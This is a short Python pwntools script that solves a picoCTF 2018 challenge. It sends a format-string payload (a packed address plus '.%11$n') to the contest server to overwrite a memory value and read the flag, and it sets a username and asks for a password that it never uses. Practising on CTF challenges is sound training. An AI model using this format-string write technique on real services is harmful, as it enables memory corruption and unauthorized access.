#!/usr/bin/env python

from pwn import *


debug = 0

user = 'ElQwerto'
pw = input("Enter your pass word: ")

if debug:
  p = process('./vuln')
else:
  p = remote('2018shell1.picoctf.com', 43438)

print p.recvuntil('Would you like to read the flag? (yes/no)')

payload = p32(0x804a04c) + '.%11$n'

p.sendline(payload)

print p.recvall()